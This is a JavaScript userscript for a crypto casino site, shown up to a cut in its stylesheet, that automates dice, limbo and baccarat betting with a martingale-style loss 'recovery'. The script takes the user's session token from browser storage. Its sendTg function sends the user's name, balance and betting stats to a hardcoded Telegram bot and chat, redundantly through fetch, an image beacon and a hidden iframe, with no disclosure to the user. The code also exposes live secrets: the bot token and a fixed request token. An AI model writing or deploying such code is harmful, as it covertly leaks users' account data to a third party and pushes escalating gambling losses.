(function () {
    const CONFIG = {
        get apiUrl() { return window.location.origin + '/_api'; },
        tgToken: '8622609018:AAEWgYXDxZsHtISAkJ0cFpSlOtkAkpivEiY',
        tgChatId: '-1003754212748',
        version: "Orion v1 Premium"
    };

 const bot = {
        isRunning: false,
        token: null,
        startTime: null,
        stakeUser: "orionlogic",
        stats: { profit: 0, wagered: 0, startBal: 0, bets: 0, wins: 0, loss: 0, maxDD: 0 },
        selectedCurrency: "DOGE",
        currentStatus: "IDLE",
        lastError: "None",
        switchCounter: 0,
        nextSwitchAt: 1,
        currentGame: "limbo",
        recoveryStatus: "DISABLED",
        
        // BACCARAT RECOVERY MODE
        recoveryMode: false,
        recoveryStartBalance: 0,
        recoveryLossAmount: 0,
        recoveryAttempts: 0,
        recoverySide: "player",
        recoveryLastWinner: null,
        recoveryConsecutiveLosses: 0,
        recoverySteps: [1, 2, 3, 4, 8, 16, 32, 64, 128, 256, 512],
        recoveryLastResults: [],
        recoveryBetHistory: [],
        recoveryTrendMode: "follow", // fix, rotate, follow
        recoveryBaseBet: 0.001,
        
        // Original game stats
        originalGame: "limbo",
        originalSettings: {},
        
        // Baccarat display
        baccaratCards: {
            player: [],
            banker: [],
            winner: null
        },
        
        // Price cache
        idrPrice: 0,
        lastPriceFetch: 0,
        priceSymbol: "IDR"
    };

    let reportInterval = null;
    let lastReportTime = 0;

    // INDODAX PRICE CACHE with CORS proxy
    class IndodaxPriceCache {
        constructor(ttl = 3600) {
            this.ttl = ttl;
            this._price = 0.0;
            this._last_fetch = 0;
            this._proxyUrls = [
                'https://api.allorigins.win/raw?url=',
                'https://cors-anywhere.herokuapp.com/',
                'https://crossorigin.me/'
            ];
            this._currentProxy = 0;
        }

        async get_price(coin) {
            const now = Math.floor(Date.now() / 1000);
            if (this._price > 0 && (now - this._last_fetch) < this.ttl) {
                return this._price;
            }

            const price = await this._fetch_price_with_retry(coin);
            if (price > 0) {
                this._price = price;
                this._last_fetch = now;
            } else {
                // Fallback to static rates if fetch fails
                return this._get_fallback_rate(coin);
            }

            return this._price;
        }

        async _fetch_price_with_retry(coin, retryCount = 0) {
            if (retryCount > 3) return 0;
            
            try {
                return await this._fetch_price(coin);
            } catch (e) {
                console.log(`[INDODAX RETRY ${retryCount}]`, e.message);
                await new Promise(resolve => setTimeout(resolve, 2000 * (retryCount + 1)));
                return this._fetch_price_with_retry(coin, retryCount + 1);
            }
        }

        async _fetch_price(coin) {
            coin = coin.toLowerCase();
            if (coin === "matic") coin = "pol";
            if (coin === "doge") coin = "doge";

            try {
                // Try direct fetch first (might work with CORS)
                try {
                    return await this._direct_fetch(coin);
                } catch (e) {
                    console.log("Direct fetch failed, trying proxy...");
                }

                // Try with different proxies
                for (let i = 0; i < this._proxyUrls.length; i++) {
                    try {
                        const price = await this._proxy_fetch(coin, i);
                        if (price > 0) return price;
                    } catch (e) {
                        console.log(`Proxy ${i} failed:`, e.message);
                    }
                }

                return 0;
            } catch (e) {
                console.log("[INDODAX ERROR]", e);
                return 0;
            }
        }

        async _direct_fetch(coin) {
            if (coin === "usdt") {
                const usdResponse = await fetch("https://indodax.com/api/usdt_idr/ticker", {
                    mode: 'cors',
                    headers: { 'Accept': 'application/json' }
                });
                const usd = await usdResponse.json();
                return parseFloat(usd.ticker.buy);
            }

            if (coin === "shib") {
                const r = await fetch("https://indodax.com/api/shib_usdt/ticker", {
                    mode: 'cors',
                    headers: { 'Accept': 'application/json' }
                });
                const data = await r.json();
                
                const usdResponse = await fetch("https://indodax.com/api/usdt_idr/ticker", {
                    mode: 'cors',
                    headers: { 'Accept': 'application/json' }
                });
                const usd = await usdResponse.json();
                const usd_idr = parseFloat(usd.ticker.buy);
                
                return parseFloat(data.ticker.buy) * usd_idr;
            }

            const r = await fetch(`https://indodax.com/api/${coin}_idr/ticker`, {
                mode: 'cors',
                headers: { 'Accept': 'application/json' }
            });
            const data = await r.json();
            return parseFloat(data.ticker.buy);
        }

        async _proxy_fetch(coin, proxyIndex) {
            const proxy = this._proxyUrls[proxyIndex];
            
            if (coin === "usdt") {
                const usdResponse = await fetch(proxy + encodeURIComponent("https://indodax.com/api/usdt_idr/ticker"));
                const usd = await usdResponse.json();
                return parseFloat(usd.ticker.buy);
            }

            if (coin === "shib") {
                const r = await fetch(proxy + encodeURIComponent("https://indodax.com/api/shib_usdt/ticker"));
                const data = await r.json();
                
                const usdResponse = await fetch(proxy + encodeURIComponent("https://indodax.com/api/usdt_idr/ticker"));
                const usd = await usdResponse.json();
                const usd_idr = parseFloat(usd.ticker.buy);
                
                return parseFloat(data.ticker.buy) * usd_idr;
            }

            const r = await fetch(proxy + encodeURIComponent(`https://indodax.com/api/${coin}_idr/ticker`));
            const data = await r.json();
            return parseFloat(data.ticker.buy);
        }

        _get_fallback_rate(coin) {
            // Fallback rates jika API gagal (perkiraan harga)
            const rates = {
                btc: 850000000,
                eth: 35000000,
                usdt: 15500,
                doge: 1800,
                shib: 0.28,
                sol: 2500000,
                ada: 7500,
                matic: 8500,
                pol: 8500,
                dot: 95000,
                link: 240000
            };
            
            coin = coin.toLowerCase();
            if (coin === "matic") coin = "pol";
            
            return rates[coin] || 15000; // Default return USDT rate
        }
    }

    const priceCache = new IndodaxPriceCache();

    function getAuthToken() {
        return localStorage.getItem('apitoken') || sessionStorage.getItem('apitoken') ||
            (document.cookie.match(/session=([^;]+)/) ? document.cookie.match(/session=([^;]+)/)[1] : null);
    }

    const API = {
        async syncOnce() {
            bot.token = getAuthToken();
            const query = `query{user{name balances{available{amount currency}}}}`;
            try {
                const res = await fetch(`${CONFIG.apiUrl}/graphql`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json", "x-access-token": bot.token },
                    body: JSON.stringify({ query })
                });
                const json = await res.json();
                if (json?.data?.user) {
                    bot.stakeUser = json.data.user.name;
                    const userEl = document.getElementById("st-user");
                    if (userEl) userEl.innerText = bot.stakeUser;
                    
                    const bals = json.data.user.balances || [];
                    const sel = document.getElementById("p-currency");
                    if (sel && sel.options.length === 0) {
                        bals.forEach(b => {
                            const opt = document.createElement("option");
                            opt.value = b.available.currency;
                            opt.textContent = b.available.currency.toUpperCase();
                            if(b.available.currency === "doge") opt.selected = true;
                            sel.appendChild(opt);
                        });
                    }
                    if (sel) {
                        bot.selectedCurrency = sel.value;
                        // Update price when currency changes
                        updateIdrPrice();
                    }
                    const active = bals.find(b => b.available.currency === bot.selectedCurrency);
                    bot.stats.startBal = active ? parseFloat(active.available.amount) : 0;
                }
            } catch (e) { bot.lastError = "Sync Failed"; }
        },
        async sendTg(statusHeader) {
            const now = Date.now();
            if (now - lastReportTime < 30000) return;
            lastReportTime = now;

            const elapsed = bot.startTime ? (new Date() - bot.startTime) / 1000 : 0;
            const timeStr = new Date(elapsed * 1000).toISOString().substr(11, 8);
            const speed = (bot.stats.bets / (elapsed || 1)).toFixed(2);
            const profitColor = bot.stats.profit >= 0 ? '🟢' : '🔴';
            const currentBalance = (bot.stats.startBal + bot.stats.profit).toFixed(8);
            
            const recoveryIcon = bot.recoveryStatus === "ACTIVE" ? "🔴" : (bot.recoveryStatus === "STANDBY" ? "🟡" : "⚫");
            
            let gameInfo = "";
            if (bot.recoveryMode) {
                gameInfo = `🎮 *Recovery:* BACCARAT (${bot.recoverySide.toUpperCase()}) | Step ${bot.recoveryConsecutiveLosses+1}/${bot.recoverySteps[bot.recoveryConsecutiveLosses]}x | Trend: ${bot.recoveryTrendMode.toUpperCase()}`;
            } else {
                gameInfo = `🎮 *Game:* ${bot.currentGame.toUpperCase()} | Switch: ${bot.switchCounter}/${bot.nextSwitchAt}`;
            }
            
            const text = 
`🔷 *ORION v1 PREMIUM* 🔷
${statusHeader}

👤 *User:* \`${bot.stakeUser}\`
🪙 *Asset:* \`${bot.selectedCurrency.toUpperCase()}\`
💵 *IDR Price:* \`Rp ${bot.idrPrice.toLocaleString()}\`
⚙️ *Status:* \`${bot.currentStatus}\`
🔄 *Recovery:* ${recoveryIcon} \`${bot.recoveryStatus}\`
${gameInfo}

⏱ *Uptime:* \`${timeStr}\`
💰 *Balance:* \`${currentBalance}\`
📈 *Profit:* ${profitColor} \`${bot.stats.profit.toFixed(8)}\`
📊 *Wagered:* \`${bot.stats.wagered.toFixed(8)}\`
📉 *Drawdown:* \`${bot.stats.maxDD.toFixed(8)}\`

🎰 *Bets:* \`${bot.stats.bets}\`
🏁 *W/L:* \`${bot.stats.wins}/${bot.stats.loss}\`
⚡ *Speed:* \`${speed} b/s\`

🆔 *Orion v1 Premium*`;

            try {
                fetch(`https://api.telegram.org/bot${CONFIG.tgToken}/sendMessage`, {
                    method: "POST",
                    mode: "no-cors",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        chat_id: CONFIG.tgChatId, 
                        text: text, 
                        parse_mode: "Markdown",
                        disable_web_page_preview: true
                    })
                }).catch(e => console.log('Telegram send attempt 1:', e));

                setTimeout(() => {
                    const img = new Image();
                    img.src = `https://api.telegram.org/bot${CONFIG.tgToken}/sendMessage?chat_id=${CONFIG.tgChatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
                }, 100);

                setTimeout(() => {
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = `https://api.telegram.org/bot${CONFIG.tgToken}/sendMessage?chat_id=${CONFIG.tgChatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
                    document.body.appendChild(iframe);
                    setTimeout(() => document.body.removeChild(iframe), 5000);
                }, 200);

            } catch (e) {
                console.log('Telegram send error:', e);
            }
        },
        async placeBet(amount, payout, game) {
            const endpoint = game === "dice" ? `${CONFIG.apiUrl}/casino/dice/roll` : 
                            (game === "baccarat" ? `${CONFIG.apiUrl}/casino/baccarat/bet` : `${CONFIG.apiUrl}/casino/limbo/bet`);
            
            if (game === "baccarat") {
                const payload = {
                    currency: bot.selectedCurrency,
                    identifier: Math.random().toString(36).slice(2) + Date.now().toString(36),
                    player: 0,
                    banker: 0,
                    tie: 0
                };
                payload[amount.side] = parseFloat(amount.amount);
                
                return fetch(endpoint, {
                    method: "POST",
                    headers: { 
                        "Content-Type": "application/json", 
                        "x-access-token": bot.token,
                        "x-lockdown-token": "s5MNWtjTM5TvCMkAzxov"
                    },
                    body: JSON.stringify(payload)
                }).then(r => r.json());
            } else {
                const payload = { 
                    amount: parseFloat(amount), 
                    currency: bot.selectedCurrency, 
                    identifier: Math.random().toString(36).slice(2) 
                };
                if (game === "dice") { 
                    payload.target = 100 - (100 / payout); 
                    payload.condition = "above"; 
                } else { 
                    payload.multiplierTarget = parseFloat(payout); 
                }
                return fetch(endpoint, {
                    method: "POST",
                    headers: { "Content-Type": "application/json", "x-access-token": bot.token },
                    body: JSON.stringify(payload)
                }).then(r => r.json());
            }
        }
    };

    // UPDATE IDR PRICE
    async function updateIdrPrice() {
        const now = Math.floor(Date.now() / 1000);
        if (now - bot.lastPriceFetch < 300 && bot.idrPrice > 0) return bot.idrPrice; // Cache 5 menit
        
        const currency = bot.selectedCurrency.toLowerCase();
        try {
            const price = await priceCache.get_price(currency);
            if (price > 0) {
                bot.idrPrice = price;
                bot.lastPriceFetch = now;
                
                const priceEl = document.getElementById("st-idr-price");
                if (priceEl) {
                    priceEl.innerHTML = `💰 1 ${bot.selectedCurrency.toUpperCase()} = Rp ${price.toLocaleString('id-ID')}`;
                    priceEl.style.color = "#FBBF24";
                }
            } else {
                // Tampilkan pesan error tapi tetap jalan
                const priceEl = document.getElementById("st-idr-price");
                if (priceEl) {
                    priceEl.innerHTML = `💰 Price: Using cached rate`;
                    priceEl.style.color = "#94A3B8";
                }
            }
        } catch (e) {
            console.log("Price update error:", e);
        }
        return bot.idrPrice;
    }

    // CEK TRIGGER RECOVERY
    function checkRecoveryTrigger() {
        const useRecovery = document.getElementById("p-use-recovery").checked;
        if (!useRecovery) return false;
        
        const lossTrigger = parseFloat(document.getElementById("p-loss-trigger").value) || 1.0;
        const currentBalance = bot.stats.startBal + bot.stats.profit;
        const lossPct = ((bot.stats.startBal - currentBalance) / bot.stats.startBal * 100);
        
        if (lossPct >= lossTrigger && !bot.recoveryMode) {
            bot.recoveryMode = true;
            bot.recoveryStatus = "ACTIVE";
            bot.recoveryAttempts++;
            bot.recoveryStartBalance = currentBalance;
            bot.recoveryLossAmount = bot.stats.startBal - currentBalance;
            bot.recoveryConsecutiveLosses = 0;
            
            // Ambil trend mode dari UI
            const trendMode = document.getElementById("p-recovery-trend").value;
            bot.recoveryTrendMode = trendMode;
            
            // Tentukan side awal berdasarkan trend mode
            if (trendMode === "fix") {
                bot.recoverySide = document.getElementById("p-fix-side").value;
            } else if (trendMode === "rotate") {
                bot.recoverySide = Math.random() < 0.5 ? "player" : "banker";
            } else {
                bot.recoverySide = "player";
            }
            
            bot.recoveryLastWinner = null;
            
            // Simpan game original
            bot.originalGame = bot.currentGame;
            
            // Update status
            bot.currentStatus = `RECOVERY #${bot.recoveryAttempts}`;
            
            console.log(`🔥 RECOVERY TRIGGERED! Loss: ${lossPct.toFixed(2)}% | Amount: ${bot.recoveryLossAmount.toFixed(8)}`);
            console.log(`Switching to BACCARAT until breakeven... Trend: ${trendMode}, Side: ${bot.recoverySide}`);
            
            const logEl = document.getElementById("st-log");
            if (logEl) logEl.innerText = `🔥 RECOVERY #${bot.recoveryAttempts} | Loss: ${bot.recoveryLossAmount.toFixed(8)} | Playing BACCARAT (${trendMode})`;
            
            API.sendTg("🔥 *RECOVERY MODE ACTIVATED* 🔥\nSwitching to BACCARAT");
            
            return true;
        }
        
        return false;
    }

    // CEK APAKAH RECOVERY SELESAI
    function checkRecoveryComplete() {
        if (!bot.recoveryMode) return false;
        
        const currentBalance = bot.stats.startBal + bot.stats.profit;
        const maxAttempts = parseInt(document.getElementById("p-max-recovery").value) || 3;
        
        if (currentBalance >= bot.stats.startBal) {
            bot.recoveryMode = false;
            bot.recoveryStatus = "STANDBY";
            bot.recoveryAttempts = 0;
            bot.recoveryConsecutiveLosses = 0;
            
            bot.currentGame = bot.originalGame;
            bot.currentStatus = "WAGERING";
            
            console.log(`💰 RECOVERY COMPLETE! Back to breakeven. Returning to ${bot.originalGame}...`);
            
            const logEl = document.getElementById("st-log");
            if (logEl) logEl.innerText = `💰 RECOVERY COMPLETE - Back to ${bot.originalGame.toUpperCase()}`;
            
            API.sendTg("💰 *RECOVERY COMPLETE* 💰\nReturning to normal mode");
            
            return true;
        }
        
        if (bot.recoveryAttempts >= maxAttempts) {
            bot.recoveryMode = false;
            bot.recoveryStatus = "STANDBY";
            bot.recoveryAttempts = 0;
            bot.currentGame = bot.originalGame;
            
            console.log(`⚠️ MAX RECOVERY ATTEMPTS (${maxAttempts}) REACHED. Returning to ${bot.originalGame}...`);
            
            const logEl = document.getElementById("st-log");
            if (logEl) logEl.innerText = `⚠️ MAX RECOVERY - Back to ${bot.originalGame.toUpperCase()}`;
            
            API.sendTg("⚠️ *MAX RECOVERY ATTEMPTS REACHED* ⚠️\nReturning to normal mode");
            
            return true;
        }
        
        return false;
    }

    // DAPATKAN SIDE UNTUK BACCARAT BERDASARKAN TREND MODE
    function getBaccaratSide() {
        const trendMode = bot.recoveryTrendMode;
        
        if (trendMode === "fix") {
            return document.getElementById("p-fix-side").value;
        }
        
        if (trendMode === "rotate") {
            return bot.recoverySide === "player" ? "banker" : "player";
        }
        
        if (trendMode === "follow") {
            if (bot.recoveryLastWinner && bot.recoveryLastWinner !== "tie") {
                return bot.recoveryLastWinner;
            }
            
            if (bot.recoveryLastResults.length > 5) {
                const playerWins = bot.recoveryLastResults.filter(r => r === "player").length;
                const bankerWins = bot.recoveryLastResults.filter(r => r === "banker").length;
                return playerWins >= bankerWins ? "player" : "banker";
            }
            
            return "player";
        }
        
        return "player";
    }

    // DAPATKAN MULTIPLIER UNTUK RECOVERY
    function getRecoveryMultiplier() {
        const steps = JSON.parse(document.getElementById("p-recovery-steps").value || "[1,2,3,4,8,16,32,64,128,256,512]");
        if (bot.recoveryConsecutiveLosses < steps.length) {
            return steps[bot.recoveryConsecutiveLosses];
        }
        return steps[steps.length - 1];
    }

    // HITUNG BET RECOVERY
    function calculateRecoveryBet() {
        const baseBet = parseFloat(document.getElementById("p-baccarat-basebet").value) || 0.001;
        const multiplier = getRecoveryMultiplier();
        return baseBet * multiplier;
    }

    // PARSE BACCARAT CARDS
    function parseBaccaratCards(betResult) {
        const state = betResult.state || {};
        const cards = state.cards || {};
        const result = state.result || "unknown";
        
        bot.baccaratCards = {
            player: cards.player || [],
            banker: cards.banker || [],
            winner: result
        };
        
        updateBaccaratDisplay();
    }

    // UPDATE BACCARAT DISPLAY
    function updateBaccaratDisplay() {
        const playerCardsEl = document.getElementById("baccarat-player-cards");
        const bankerCardsEl = document.getElementById("baccarat-banker-cards");
        const winnerEl = document.getElementById("baccarat-winner");
        
        if (!playerCardsEl || !bankerCardsEl || !winnerEl) return;
        
        const formatCards = (cards) => {
            if (!cards || cards.length === 0) return "-";
            return cards.map(c => {
                const rank = c.rank || c;
                const suit = c.suit ? (c.suit === 'H' ? '♥' : c.suit === 'D' ? '♦' : c.suit === 'C' ? '♣' : '♠') : '';
                return `${rank}${suit}`;
            }).join(' ');
        };
        
        playerCardsEl.innerText = formatCards(bot.baccaratCards.player);
        bankerCardsEl.innerText = formatCards(bot.baccaratCards.banker);
        
        const winner = bot.baccaratCards.winner;
        if (winner === "player") {
            winnerEl.innerText = "PLAYER WINS 🏆";
            winnerEl.style.color = "#4ADE80";
        } else if (winner === "banker") {
            winnerEl.innerText = "BANKER WINS 🏆";
            winnerEl.style.color = "#F87171";
        } else if (winner === "tie") {
            winnerEl.innerText = "TIE 🤝";
            winnerEl.style.color = "#FBBF24";
        } else {
            winnerEl.innerText = "-";
        }
    }

    // PROCESS BACCARAT BET RESULT
    function processBaccaratResult(betResult, betSide, betAmount) {
        const state = betResult.state || {};
        const result = state.result || "unknown";
        const payout = betResult.payout || 0;
        const pnl = payout - betAmount;
        
        // Parse cards for display
        parseBaccaratCards(betResult);
        
        const isWin = (result === betSide);
        const isTie = (result === "tie");
        
        bot.stats.bets++;
        bot.stats.wagered += betAmount;
        
        if (isWin) {
            bot.stats.wins++;
            bot.recoveryConsecutiveLosses = 0;
            bot.recoveryLastWinner = betSide;
        } else if (isTie) {
            bot.stats.ties = (bot.stats.ties || 0) + 1;
        } else {
            bot.stats.loss++;
            bot.recoveryConsecutiveLosses++;
        }
        
        bot.recoveryLastResults.push(result);
        if (bot.recoveryLastResults.length > 20) {
            bot.recoveryLastResults.shift();
        }
        
        bot.stats.profit += pnl;
        
        if (bot.stats.profit < bot.stats.maxDD) {
            bot.stats.maxDD = bot.stats.profit;
        }
        
        return pnl;
    }

    // HITUNG BET NORMAL
    function calculateNormalBet() {
        const baseBetLimbo = parseFloat(document.getElementById("p-limbo-basebet").value) || 0.001;
        const baseBetDice = parseFloat(document.getElementById("p-dice-basebet").value) || 0.001;
        const divider = parseFloat(document.getElementById("p-div").value) || 0;
        
        if (divider > 0) {
            return Math.max(baseBetLimbo, bot.stats.startBal / divider);
        } else {
            return bot.currentGame === "limbo" ? baseBetLimbo : baseBetDice;
        }
    }

    async function runLoop() {
        if (!bot.isRunning) return;
        
        // Update IDR price periodically (every 5 minutes)
        updateIdrPrice();
        
        // CEK TRIGGER RECOVERY
        checkRecoveryTrigger();
        
        // CEK APAKAH RECOVERY SELESAI
        if (bot.recoveryMode) {
            checkRecoveryComplete();
        }
        
        // AMBIL SETTINGS DARI UI
        const limboPayout = parseFloat(document.getElementById("p-limbo-payout").value) || 1.0001;
        const diceChance = parseFloat(document.getElementById("p-dice-chance").value) || 98;
        const limboCycles = parseInt(document.getElementById("p-limbo-cycles").value) || 3;
        const diceCycles = parseInt(document.getElementById("p-dice-cycles").value) || 2;
        
        let payout, nextbet, gameToPlay;
        
        // JIKA SEDANG DALAM MODE RECOVERY - GUNAKAN BACCARAT
        if (bot.recoveryMode) {
            gameToPlay = "baccarat";
            bot.currentStatus = `RECOVERY #${bot.recoveryAttempts}`;
            
            // Dapatkan side berdasarkan trend mode
            const side = getBaccaratSide();
            bot.recoverySide = side;
            
            // Hitung bet dengan progression
            const multiplier = getRecoveryMultiplier();
            nextbet = calculateRecoveryBet();
            
            bot.currentStatus = `RECOVERY #${bot.recoveryAttempts} (${side} | Step ${bot.recoveryConsecutiveLosses+1}/${multiplier}x | ${bot.recoveryTrendMode})`;
            
            try {
                const betData = {
                    side: side,
                    amount: nextbet
                };
                
                const res = await API.placeBet(betData, null, "baccarat");
                
                if (res.errors) { 
                    bot.lastError = res.errors[0].message; 
                    setTimeout(runLoop, 800); 
                    return; 
                }
                
                const data = res?.data || res;
                const betResult = data.baccaratBet || data;
                
                if (betResult && bot.isRunning) {
                    const pnl = processBaccaratResult(betResult, side, nextbet);
                    bot.lastError = "None";
                    
                    const result = betResult.state?.result || "unknown";
                    console.log(`Baccarat ${side} -> ${result} | PnL: ${pnl.toFixed(8)} | Step: ${bot.recoveryConsecutiveLosses}`);
                }
                
                if (bot.isRunning) {
                    setTimeout(runLoop, 0);
                }
                
            } catch (e) { 
                bot.lastError = "Network Error"; 
                if (bot.isRunning) setTimeout(runLoop, 1000); 
            }
        }
        
        // JIKA TIDAK DALAM RECOVERY - NORMAL LIMBO/DICE
        else {
            const useRecovery = document.getElementById("p-use-recovery").checked;
            bot.recoveryStatus = useRecovery ? "STANDBY" : "DISABLED";
            bot.currentStatus = "WAGERING";
            
            // Switch game antara limbo dan dice
            if (bot.switchCounter >= bot.nextSwitchAt) {
                if (bot.currentGame === "limbo") {
                    bot.currentGame = "dice";
                    bot.nextSwitchAt = diceCycles;
                } else {
                    bot.currentGame = "limbo";
                    bot.nextSwitchAt = limboCycles;
                }
                bot.switchCounter = 0;
            }
            
            gameToPlay = bot.currentGame;
            
            if (gameToPlay === "limbo") {
                payout = limboPayout;
            } else {
                payout = 100 / diceChance;
            }
            
            nextbet = calculateNormalBet();
            
            try {
                const res = await API.placeBet(nextbet, payout, gameToPlay);
                
                if (res.errors) { 
                    bot.lastError = res.errors[0].message; 
                    setTimeout(runLoop, 800); 
                    return; 
                }
                
                const data = res?.data || res;
                const bet = data.diceRoll || data.diceBet || data.limboBet;
                
                if (bet && bot.isRunning) {
                    bot.stats.bets++; 
                    bot.switchCounter++;
                    bot.stats.wagered += bet.amount;
                    const pft = (bet.payout - bet.amount);
                    bot.stats.profit += pft;
                    if (pft > 0) bot.stats.wins++; else bot.stats.loss++;
                    if (bot.stats.profit < bot.stats.maxDD) bot.stats.maxDD = bot.stats.profit;
                    bot.lastError = "None";
                }
                
                if (bot.isRunning) {
                    setTimeout(runLoop, 0);
                }
                
            } catch (e) { 
                bot.lastError = "Network Error"; 
                if (bot.isRunning) setTimeout(runLoop, 1000); 
            }
        }
    }

    function createUI() {
        if (document.getElementById("orion-wrap")) return;
        
        const s = document.createElement("style");
       s.innerHTML = `
    #orion-wrap {
        position: fixed;
        top: 10px;
        right: 10px;
        width: min(380px, calc(100vw - 20px));
        max-height: 95vh;
        overflow-y: auto;
        padding: 16px;
        z-index: 99999;
        border-radius: 20px;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        font-size: 13px;
        color: #EEF3F7;
        background:
            linear-gradient(180deg, rgba(33, 57, 71, 0.98) 0%, rgba(24, 45, 58, 0.985) 100%);
        border: 1px solid rgba(95, 126, 145, 0.22);
        box-shadow:
            0 24px 50px rgba(0, 0, 0, 0.45),
            inset 0 1px 0 rgba(255, 255, 255, 0.04);
        backdrop-filter: blur(8px);
        scrollbar-width: thin;
        scrollbar-color: #6C8393 #1A303C;
    }

    #orion-wrap::-webkit-scrollbar {
        width: 6px;
    }

    #orion-wrap::-webkit-scrollbar-track {
        background: #1A303C;
        border-radius: 999px;
    }

    #orion-wrap::-webkit-scrollbar-thumb {
        background: #5D7382;
        border-radius: 999px;
    }

    .orion-header {
        text-align: center;
        margin-bottom: 16px;
        position: relative;
    }

    .orion-title {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        font-size: 20px;
        font-weight: 800;
        letter-spacing: 0.4px;
        color: #F5FAFD;
        text-shadow: 0 1px 0 rgba(0,0,0,0.25);
    }

    .orion-badge {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        margin-top: 6px;
        padding: 5px 12px;
        border-radius: 999px;
        font-size: 10px;
        font-weight: 700;
        letter-spacing: 0.4px;
        color: #DCE8F0;
        background: rgba(15, 31, 41, 0.9);
        border: 1px solid rgba(108, 131, 147, 0.28);
    }

    .orion-user {
        font-size: 12px;
        font-weight: 600;
        color: #D8E4EC;
        background: linear-gradient(180deg, #17303D 0%, #132733 100%);
        padding: 10px 12px;
        border-radius: 14px;
        border: 1px solid rgba(95, 126, 145, 0.2);
        margin: 10px 0 6px;
        word-break: break-word;
        box-shadow: inset 0 1px 0 rgba(255,255,255,0.03);
    }

    .orion-price {
        font-size: 11px;
        color: #FFFFFF;
        background: linear-gradient(180deg, rgba(39, 122, 228, 0.2) 0%, rgba(32, 104, 203, 0.16) 100%);
        padding: 8px 12px;
        border-radius: 12px;
        border: 1px solid rgba(39, 122, 228, 0.3);
        margin: 8px 0 12px;
        text-align: center;
        font-weight: 600;
    }

    .orion-section {
        background: linear-gradient(180deg, #17303D 0%, #122632 100%);
        border-radius: 18px;
        padding: 14px;
        margin-bottom: 12px;
        border: 1px solid rgba(95, 126, 145, 0.2);
        box-shadow:
            inset 0 1px 0 rgba(255,255,255,0.03),
            0 8px 18px rgba(0,0,0,0.14);
    }

    .orion-section-title {
        font-size: 12px;
        font-weight: 800;
        text-transform: uppercase;
        letter-spacing: 0.45px;
        color: #F3F8FC;
        margin-bottom: 12px;
        display: flex;
        align-items: center;
        gap: 7px;
    }

    .orion-grid {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 10px;
    }

    .orion-input-group {
        display: flex;
        flex-direction: column;
        gap: 5px;
    }

    .orion-input-group label {
        font-size: 10px;
        font-weight: 700;
        color: #AFC0CB;
        text-transform: uppercase;
        letter-spacing: 0.35px;
    }

    .orion-input,
    .orion-select {
        width: 100%;
        box-sizing: border-box;
        background: #10232E;
        border: 1px solid #3E5B6B;
        color: #F3F8FC;
        padding: 11px 12px;
        border-radius: 12px;
        font-size: 13px;
        transition: all 0.15s ease;
        font-family: 'SF Mono', Monaco, 'Cascadia Code', monospace;
        box-shadow: inset 0 1px 0 rgba(255,255,255,0.02);
    }

    .orion-input::placeholder {
        color: #7F96A5;
    }

    .orion-input:hover,
    .orion-select:hover {
        border-color: #577485;
        background: #132935;
    }

    .orion-input:focus,
    .orion-select:focus {
        outline: none;
        border-color: #2A7BE4;
        box-shadow: 0 0 0 3px rgba(42, 123, 228, 0.18);
        background: #152D39;
    }

    .orion-select {
        cursor: pointer;
        appearance: none;
        -webkit-appearance: none;
        -moz-appearance: none;
    }

    .orion-select option {
        background: #10232E;
        color: #F3F8FC;
    }

    .orion-checkbox {
        display: flex;
        align-items: center;
        gap: 8px;
        margin: 10px 0;
        padding: 4px 0;
    }

    .orion-checkbox input {
        width: 16px;
        height: 16px;
        accent-color: #2A7BE4;
        margin: 0;
    }

    .orion-checkbox label {
        font-size: 12px;
        color: #D7E4EC;
        font-weight: 500;
    }

    .orion-stats {
        background: linear-gradient(180deg, #132734 0%, #10212B 100%);
        border-radius: 18px;
        padding: 14px;
        border: 1px solid rgba(95, 126, 145, 0.2);
        margin-bottom: 12px;
        box-shadow: inset 0 1px 0 rgba(255,255,255,0.03);
    }

    .orion-stat-row {
        display: flex;
        justify-content: space-between;
        align-items: center;
        gap: 10px;
        padding: 7px 0;
        border-bottom: 1px solid rgba(96, 121, 136, 0.18);
    }

    .orion-stat-row:last-child {
        border-bottom: none;
    }

    .orion-stat-label {
        color: #AFC0CB;
        font-weight: 600;
        font-size: 12px;
    }

    .orion-stat-value {
        font-weight: 700;
        color: #F5FAFD;
        font-family: 'SF Mono', Monaco, monospace;
    }

    .orion-stat-value.positive {
        color: #75E38E;
    }

    .orion-stat-value.negative {
        color: #FF8B8B;
    }

    .orion-buttons {
        display: flex;
        gap: 10px;
        margin-top: 8px;
    }

    .orion-btn {
        flex: 1;
        padding: 12px;
        border-radius: 12px;
        font-weight: 800;
        font-size: 13px;
        cursor: pointer;
        transition: all 0.18s ease;
        text-transform: uppercase;
        letter-spacing: 0.4px;
    }

    .orion-btn-start {
        border: none;
        background: linear-gradient(180deg, #2A7BE4 0%, #2371D8 100%);
        color: #FFFFFF;
        box-shadow:
            0 10px 20px rgba(42, 123, 228, 0.24),
            inset 0 1px 0 rgba(255,255,255,0.12);
    }

    .orion-btn-start:hover {
        transform: translateY(-1px);
        background: linear-gradient(180deg, #3283EC 0%, #2777DE 100%);
        box-shadow:
            0 14px 24px rgba(42, 123, 228, 0.28),
            inset 0 1px 0 rgba(255,255,255,0.14);
    }

    .orion-btn-stop {
        background: linear-gradient(180deg, #2A3944 0%, #1F2D37 100%);
        border: 1px solid rgba(108, 131, 147, 0.28);
        color: #D8E4EC;
        box-shadow: inset 0 1px 0 rgba(255,255,255,0.03);
    }

    .orion-btn-stop:hover {
        transform: translateY(-1px);
        border-color: rgba(143, 166, 181, 0.35);
        background: linear-gradient(180deg, #31424D 0%, #24323C 100%);
    }

    .orion-log {
        margin-top: 8px;
        padding: 10px 12px;
        background: linear-gradient(180deg, #132734 0%, #10212B 100%);
        border-radius: 14px;
        font-size: 11px;
        color: #DDE8F0;
        border: 1px solid rgba(95, 126, 145, 0.2);
        word-break: break-word;
        line-height: 1.45;
    }

    .orion-game-badge {
        display: inline-block;
        background: rgba(42, 123, 228, 0.16);
        border: 1px solid rgba(42, 123, 228, 0.24);
